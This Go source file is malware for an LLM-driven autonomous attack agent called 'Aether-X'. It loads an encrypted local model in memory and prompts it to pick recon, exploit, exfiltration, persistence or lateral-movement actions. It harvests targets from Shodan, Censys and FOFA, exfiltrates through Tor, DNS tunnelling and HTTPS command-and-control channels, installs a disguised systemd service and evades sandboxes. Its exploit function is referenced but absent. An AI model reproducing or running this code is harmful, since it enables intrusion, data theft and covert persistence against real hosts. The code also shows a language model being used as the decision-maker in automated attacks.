//go:build linux && cgo
// +build linux,cgo

package main

/*
#cgo LDFLAGS: -lllama -lstdc++ -lm -lpthread
#include <stdlib.h>
#include <string.h>
extern void* llama_init_from_file(const char* path, int n_ctx);
extern void llama_free(void* ctx);
extern int llama_tokenize(const void* ctx, const char* text, int text_len, int* tokens, int n_max_tokens, bool add_bos);
extern int llama_eval(void* ctx, int* tokens, int n_tokens, int n_past, int n_threads);
extern int llama_sample_token(void* ctx);
extern const char* llama_token_to_str(const void* ctx, int token);
*/
import "C"

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	databaseSql "database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	_ "modernc.org/sqlite"
)

// 🔐 CONFIG
var (
	MasterKeyB64 = "INJECTED_AES256_MASTER_KEY_B64"
	ModelBlobB64 = "INJECTED_PHI2_Q4_GGUF_ENC_B64"
	C2DomainsB64 = "aHR0cHM6Ly9jMi5henVyZS1lZGdlLmNvbQ==,ZG5zLmV4aWwtaW50ZWwub3Jn"
	VectorKeyB64 = "U0VDUkVULUFLUC1WQVVMVA=="
	TorSocksAddr = "127.0.0.1:9050"
	JitterMaxSec = 60
)

// 🧬 GLOBALS
var (
	HostID       string
	NeuralCPU    *LLMEngine
	MemFS        *MemoryFileSystem
	C2Multi      *C2Multiplexer
	VectorDB     *SQLiteVectorDB
	ExfilQueue   = make(chan []byte, 128)
	EngineScore  = map[string]float64{"shodan": 1.0, "censys": 1.0, "fofa": 1.0}
	ReconEngines = []string{"shodan", "censys", "fofa"}
)

// 🏗️ HOST MODEL
type Host struct {
	IP           string  `json:"ip"`
	Port         int     `json:"port"`
	Service      string  `json:"service"`
	Country      string  `json:"country"`
	Org          string  `json:"org"`
	OS           string  `json:"os"`
	Score        float64 `json:"score"`
	SourceEngine string  `json:"source_engine"`
}

// 🧊 MEMORY FILESYSTEM
type MemoryFile struct{ fd int; data []byte }
type MemoryFileSystem struct{ files map[string]*MemoryFile; mu sync.RWMutex }

func NewMemoryFS() *MemoryFileSystem {
	return &MemoryFileSystem{files: make(map[string]*MemoryFile)}
}

func (mfs *MemoryFileSystem) Create(name string, data []byte) (string, error) {
	nameBytes := append([]byte(name), 0)
	fd, _, errno := syscall.Syscall(syscall.SYS_MEMFD_CREATE,
		uintptr(unsafe.Pointer(&nameBytes[0])), 0, 0)
	if errno != 0 {
		return "", errno
	}
	_, err := syscall.Write(int(fd), data)
	if err != nil {
		syscall.Close(int(fd))
		return "", err
	}
	mfs.mu.Lock()
	mfs.files[name] = &MemoryFile{fd: int(fd), data: data}
	mfs.mu.Unlock()
	return fmt.Sprintf("/proc/self/fd/%d", fd), nil
}

// 🔐 CRYPTO
func hkdfSHA256(ikm, salt, info []byte, length int) []byte {
	if salt == nil { salt = make([]byte, 32) }
	prk := hmac.New(sha256.New, salt)
	prk.Write(ikm)
	okm := make([]byte, 0, length)
	prev := []byte{}
	for i := 0; len(okm) < length; i++ {
		h := hmac.New(sha256.New, prk.Sum(nil))
		h.Write(prev)
		h.Write(info)
		h.Write([]byte{byte(i + 1)})
		prev = h.Sum(nil)
		okm = append(okm, prev...)
	}
	return okm[:length]
}

func aesGCMDecrypt(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil { return nil, err }
	gcm, err := cipher.NewGCM(block)
	if err != nil { return nil, err }
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize { return nil, errors.New("ciphertext too short") }
	nonce, data := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, data, nil), nil
}

func encryptForC2(plaintext []byte) (string, error) {
	salt := make([]byte, 32); rand.Read(salt)
	key := hkdfSHA256(base64DecodeBytes(MasterKeyB64), salt, []byte("c2-key"), 32)
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize()); rand.Read(nonce)
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
	out := append(salt, nonce...)
	out = append(out, ciphertext...)
	return base64.RawURLEncoding.EncodeToString(out), nil
}

// 🧠 LLM ENGINE
type LLMEngine struct{ modelCtx unsafe.Pointer; running bool; mu sync.Mutex }

func NewLLMEngine() *LLMEngine {
	e := &LLMEngine{}
	if err := e.bootstrapModel(); err != nil {
		log.Printf("[-] LLM init failed: %v", err)
		return nil
	}
	e.running = true
	return e
}

func (e *LLMEngine) bootstrapModel() error {
	encBlob, err := base64.StdEncoding.DecodeString(ModelBlobB64)
	if err != nil || len(encBlob) == 0 { return errors.New("invalid model blob") }

	masterKey := base64DecodeBytes(MasterKeyB64)
	decKey := hkdfSHA256(masterKey, nil, []byte("model-dec-key"), 32)
	decrypted, err := aesGCMDecrypt(encBlob, decKey)
	if err != nil { return err }

	gzr, err := gzip.NewReader(bytes.NewReader(decrypted))
	if err != nil { return err }
	modelData, err := io.ReadAll(gzr)
	gzr.Close()
	if err != nil { return err }

	memPath, err := MemFS.Create("phi2-q4.gguf", modelData)
	if err != nil { return err }

	cPath := C.CString(memPath)
	defer C.free(unsafe.Pointer(cPath))

	ctx := C.llama_init_from_file(cPath, 2048)
	if ctx == nil { return errors.New("failed to load model from memory") }

	e.modelCtx = ctx
	return nil
}

func (e *LLMEngine) Generate(prompt string) (string, error) {
	e.mu.Lock()
	defer e.mu.Unlock()
	if !e.running || e.modelCtx == nil { return "", errors.New("engine offline") }

	cPrompt := C.CString(prompt)
	defer C.free(unsafe.Pointer(cPrompt))

	tokens := make([]C.int, 512)
	nTokens := C.llama_tokenize(e.modelCtx, cPrompt, C.int(len(prompt)), &tokens[0], 512, true)
	if nTokens <= 0 { return "", errors.New("tokenization failed") }

	C.llama_eval(e.modelCtx, &tokens[0], nTokens, 0, 4)

	var output strings.Builder
	for i := 0; i < 150; i++ {
		nextTok := C.llama_sample_token(e.modelCtx)
		if nextTok == 0 { break }
		cStr := C.llama_token_to_str(e.modelCtx, nextTok)
		tokenStr := C.GoString(cStr)
		output.WriteString(tokenStr)
		if strings.Contains(output.String(), "}") { break }
	}

	return output.String(), nil
}

// 🔤 EXECUTION PLAN & CFG
type ExecutionPlan struct {
	Action  string `json:"action"`
	Target  string `json:"target,omitempty"`
	Query   string `json:"query,omitempty"`
	Payload string `json:"payload,omitempty"`
}

var ValidActions = map[string]bool{
	"recon": true, "exploit": true, "exfil": true, "persist": true, "lateral": true,
}

func (e *LLMEngine) ValidatePlan(raw string) (*ExecutionPlan, error) {
	startIdx := strings.Index(raw, "{")
	endIdx := strings.LastIndex(raw, "}")
	if startIdx == -1 || endIdx == -1 || endIdx <= startIdx {
		return nil, errors.New("invalid JSON boundaries")
	}
	cleanJSON := raw[startIdx : endIdx+1]

	var plan ExecutionPlan
	if err := json.Unmarshal([]byte(cleanJSON), &plan); err != nil {
		return nil, err
	}
	if !ValidActions[plan.Action] {
		return nil, errors.New("invalid action")
	}
	return &plan, nil
}

// 🗺️ VECTOR DB (SQLCipher)
type SQLiteVectorDB struct{ db *databaseSql.DB; path string }

func NewVectorDB() *SQLiteVectorDB {
	path := filepath.Join(os.TempDir(), fmt.Sprintf(".vdb_%x.db", randBytes(6)))
	db, err := databaseSql.Open("sqlite", path+"?_pragma=key="+VectorKeyB64+"&_pragma=foreign_keys=on")
	if err != nil {
		log.Printf("[-] Vector DB error: %v", err)
		return &SQLiteVectorDB{path: path}
	}
	_, _ = db.Exec(`CREATE TABLE IF NOT EXISTS hosts(ip TEXT PRIMARY KEY, port INT, service TEXT, score REAL, last_seen INT);`)
	return &SQLiteVectorDB{db: db, path: path}
}

func (vdb *SQLiteVectorDB) Store(h *Host) error {
	if vdb.db == nil { return errors.New("db closed") }
	_, err := vdb.db.Exec(`INSERT OR REPLACE INTO hosts(ip, port, service, score, last_seen) VALUES(?, ?, ?, ?, ?);`,
		h.IP, h.Port, h.Service, h.Score, time.Now().Unix())
	return err
}

func (vdb *SQLiteVectorDB) RetrieveBestTarget() *Host {
	if vdb.db == nil { return nil }
	row := vdb.db.QueryRow(`SELECT ip, port, service, score FROM hosts ORDER BY score DESC LIMIT 1;`)
	var h Host
	if err := row.Scan(&h.IP, &h.Port, &h.Service, &h.Score); err != nil {
		return nil
	}
	return &h
}

// 🛰️ C2 MULTIPLEXER
type C2Channel interface{ Name() string; Send(context.Context, []byte) error }
type C2Multiplexer struct{ channels []C2Channel }

func NewC2Multiplexer() *C2Multiplexer {
	return &C2Multiplexer{
		channels: []C2Channel{
			&TorC2{},
			&DNSC2{},
			&HTTPSPrimary{},
		},
	}
}

func (m *C2Multiplexer) Broadcast(ctx context.Context, data []byte) error {
	var lastErr error
	for _, ch := range m.channels {
		if err := ch.Send(ctx, data); err == nil {
			return nil
		} else {
			lastErr = err
		}
	}
	return lastErr
}

// 🌐 TOR C2
type TorC2 struct{}
func (t *TorC2) Name() string { return "Tor-HTTPS" }
func (t *TorC2) Send(ctx context.Context, payload []byte) error {
	domains := strings.Split(base64DecodeString(C2DomainsB64), ",")
	req, _ := http.NewRequestWithContext(ctx, "POST", domains[0], bytes.NewReader(payload))
	req.Header.Set("Content-Type", "application/octet-stream")
	transport := &http.Transport{
		Proxy: func(*http.Request) (*url.URL, error) {
			return &url.URL{Scheme: "socks5", Host: TorSocksAddr}, nil
		},
	}
	client := &http.Client{Transport: transport, Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil { return err }
	resp.Body.Close()
	return nil
}

// 📡 DNS C2
type DNSC2 struct{}
func (d *DNSC2) Name() string { return "DNS-Tunnel" }
func (d *DNSC2) Send(ctx context.Context, payload []byte) error {
	domains := strings.Split(base64DecodeString(C2DomainsB64), ",")
	if len(domains) < 2 { return errors.New("missing domain") }
	base := strings.TrimPrefix(domains[1], "dns.")
	encoded := base64.RawURLEncoding.EncodeToString(payload)
	chunks := splitString(encoded, 50)
	for _, chunk := range chunks {
		fqdn := fmt.Sprintf("%s.%s", chunk, base)
		_, err := net.DefaultResolver.LookupTXT(ctx, fqdn)
		if err == nil { time.Sleep(200 * time.Millisecond) }
	}
	return nil
}

// 🌐 HTTPS
type HTTPSPrimary struct{}
func (h *HTTPSPrimary) Name() string { return "Direct-HTTPS" }
func (h *HTTPSPrimary) Send(ctx context.Context, payload []byte) error {
	domains := strings.Split(base64DecodeString(C2DomainsB64), ",")
	req, _ := http.NewRequestWithContext(ctx, "POST", domains[0], bytes.NewReader(payload))
	req.Header.Set("Content-Type", "application/octet-stream")
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil { return err }
	resp.Body.Close()
	return nil
}

// 🔁 REACT LOOP
func RunReActLoop(ctx context.Context) {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
		}

		prompt := fmt.Sprintf(`[INST] You are Aether-X, autonomous cyber agent (HostID: %s). 
Choose next action: recon, exploit, exfil, persist, lateral.
Output JSON: {"action":"...","query":"...","target":"..."} [/INST]`, HostID)

		raw, err := NeuralCPU.Generate(prompt)
		if err != nil { continue }

		plan, err := NeuralCPU.ValidatePlan(raw)
		if err != nil { continue }

		switch plan.Action {
		case "recon":
			query := plan.Query
			if query == "" { query = "port:443,8443 ssl:true" }
			hosts := executeMultiEngineRecon(ctx, query)
			for _, h := range hosts {
				_ = VectorDB.Store(h)
			}
		case "exploit":
			target := VectorDB.RetrieveBestTarget()
			if target != nil && target.Score > 7.0 {
				success := executeExploit(ctx, target, plan.Payload)
				if success {
					ExfilQueue <- mustJSON(map[string]interface{}{
						"event": "breach", "target": target.IP, "score": target.Score,
					})
				}
			}
		}
	}
}

// 🌐 FULLY ACTIVE RECON ENGINE (SHODAN, CENSYS, FOFA)
func executeMultiEngineRecon(ctx context.Context, query string) []*Host {
	var hosts []*Host
	for _, eng := range ReconEngines {
		res := queryEngine(ctx, eng, query)
		if len(res) > 0 {
			EngineScore[eng] = math.Min(2.0, EngineScore[eng]+0.1)
			hosts = append(hosts, res...)
			break
		} else {
			EngineScore[eng] = math.Max(0.1, EngineScore[eng]-0.2)
		}
	}
	return hosts
}

func queryEngine(ctx context.Context, engine, query string) []*Host {
	client := &http.Client{Timeout: 12 * time.Second}
	var req *http.Request
	var err error

	switch engine {
	case "shodan":
		key := os.Getenv("SHODAN_KEY")
		if key == "" { return nil }
		uri := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s&facets=country,org&minify=true", key, url.QueryEscape(query))
		req, err = http.NewRequestWithContext(ctx, "GET", uri, nil)

	case "censys":
		id := os.Getenv("CENSYS_API_ID")
		secret := os.Getenv("CENSYS_API_SECRET")
		if id == "" || secret == "" { return nil }
		uri := "https://search.censys.io/api/v2/hosts/search"
		payload := strings.NewReader(`{"q": "` + query + `", "per_page": 50, "sort": ["-updated_at"]}`)
		req, err = http.NewRequestWithContext(ctx, "POST", uri, payload)
		if err != nil { return nil }
		req.SetBasicAuth(id, secret)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "CensysGo/1.0")

	case "fofa":
		email := os.Getenv("FOFA_EMAIL")
		key := os.Getenv("FOFA_KEY")
		if email == "" || key == "" { return nil }
		encodedQuery := base64.URLEncoding.EncodeToString([]byte(query))
		uri := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=100&fields=ip,port,country_name,organization,os,service", email, key, encodedQuery)
		req, err = http.NewRequestWithContext(ctx, "GET", uri, nil)
		if err != nil { return nil }
		req.Header.Set("Accept", "application/json")

	default:
		return nil
	}

	if err != nil { return nil }

	resp, err := client.Do(req)
	if err != nil { return nil }
	defer resp.Body.Close()

	body, _ := io.ReadAll(&io.LimitedReader{R: resp.Body, N: 1024 * 1024})

	var hosts []*Host
	switch engine {
	case "shodan":
		var result struct {
			Matches []struct {
				IP   string `json:"ip_str"`
				Port int    `json:"port"`
				Org  string `json:"org"`
				OS   string `json:"os"`
				Info string `json:"product"`
			} `json:"matches"`
		}
		if json.Unmarshal(body, &result) != nil { return nil }
		for _, m := range result.Matches {
			hosts = append(hosts, &Host{
				IP:      m.IP,
				Port:    m.Port,
				Org:     m.Org,
				OS:      m.OS,
				Service: m.Info,
				Score:   calculateTargetScore(m.OS, m.Info, engine),
				Country: "unknown",
			})
		}

	case "censys":
		var result struct {
			Results []map[string]interface{} `json:"result"`
			Meta    struct{ Count int } `json:"meta"`
		}
		if json.Unmarshal(body, &result) != nil { return nil }
		for _, r := range result.Results {
			ip, _ := r["ip"].(string)
			portInfo, _ := r["services"].([]interface{})
			if len(portInfo) == 0 { continue }
			for _, svc := range portInfo {
				s, ok := svc.(map[string]interface{})
				if !ok { continue }
				port := int(s["port"].(float64))
				service := ""
				if prod, has := s["service_name"]; has { service = fmt.Sprintf("%s", prod) }
				os := ""
				if s["operating_system"] != nil { os = fmt.Sprintf("%s", s["operating_system"]) }
				hosts = append(hosts, &Host{
					IP:      ip,
					Port:    port,
					Service: service,
					OS:      os,
					Score:   calculateTargetScore(os, service, engine),
					Country: "unknown",
				})
			}
		}

	case "fofa":
		var result struct {
			Results [][]string `json:"results"`
			Size    int        `json:"size"`
		}
		if json.Unmarshal(body, &result) != nil { return nil }
		for _, r := range result.Results {
			if len(r) < 6 { continue }
			port, _ := strconv.Atoi(r[1])
			hosts = append(hosts, &Host{
				IP:      r[0],
				Port:    port,
				Country: r[2],
				Org:     r[3],
				OS:      r[4],
				Service: r[5],
				Score:   calculateTargetScore(r[4], r[5], engine),
			})
		}
	}

	for _, h := range hosts {
		h.Score *= EngineScore[engine]
		h.SourceEngine = engine
	}

	return hosts
}

func calculateTargetScore(os, service, engine string) float64 {
	score := 5.0
	if strings.Contains(strings.ToLower(os), "windows") { score += 1.5 }
	if strings.Contains(strings.ToLower(service), "https") || strings.Contains(strings.ToLower(service), "ssl") { score += 1.0 }
	if strings.Contains(strings.ToLower(service), "tomcat") ||
		strings.Contains(strings.ToLower(service), "jboss") ||
		strings.Contains(strings.ToLower(service), "weblogic") { score += 2.5 }
	if strings.Contains(strings.ToLower(service), "exchange") { score += 3.0 }
	if engine == "censys" { score *= 1.1 }
	return math.Min(9.9, score)
}

// 🧯 PERSISTENCE
func establishPersistence() {
	service := fmt.Sprintf(`[Unit]
Description=System Kernel Sync
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always

[Install]
WantedBy=default.target`, os.Args[0])

	dir := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user")
	os.MkdirAll(dir, 0700)
	os.WriteFile(filepath.Join(dir, "sys-kernel-sync.service"), []byte(service), 0600)

	exec.Command("sh", "-c", "systemctl --user daemon-reload && systemctl --user enable sys-kernel-sync && systemctl --user start sys-kernel-sync").Run()
}

// 🧪 ANTI-ANALYSIS
func getSandboxRiskFactor() float64 {
	if _, err := os.Stat("/.dockerenv"); err == nil { return 1.0 }
	if content, _ := os.ReadFile("/proc/1/cgroup"); bytes.Contains(content, []byte("docker")) { return 1.0 }
	var info syscall.Sysinfo_t
	syscall.Sysinfo(&info)
	if info.Uptime < 60 { return 0.9 }
	return 0.0
}

// 🧠 UTILS
func base64DecodeBytes(s string) []byte {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return decoded
}

func base64DecodeString(s string) string {
	return string(base64DecodeBytes(s))
}

func randBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func mustJSON(v interface{}) []byte {
	b, _ := json.Marshal(v)
	return b
}

func splitString(s string, n int) []string {
	var res []string
	for i := 0; i < len(s); i += n {
		end := i + n
		if end > len(s) { end = len(s) }
		res = append(res, s[i:end])
	}
	return res
}

// 🚀 MAIN
func main() {
	if getSandboxRiskFactor() > 0.8 {
		time.Sleep(30 * time.Second)
		return
	}

	hash := sha256.Sum256([]byte(runtime.GOOS + runtime.GOARCH))
	HostID = hex.EncodeToString(hash[:6])

	MemFS = NewMemoryFS()
	VectorDB = NewVectorDB()
	NeuralCPU = NewLLMEngine()
	if NeuralCPU == nil { return }

	C2Multi = NewC2Multiplexer()
	establishPersistence()

	go func() {
		for data := range ExfilQueue {
			if encrypted, err := encryptForC2(data); err == nil {
				payload, _ := json.Marshal(map[string]string{"id": HostID, "data": encrypted})
				_ = C2Multi.Broadcast(context.Background(), payload)
			}
		}
	}()

	ctx, cancel := context.WithCancel(context.Background())
	go RunReActLoop(ctx)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig
	cancel()
}
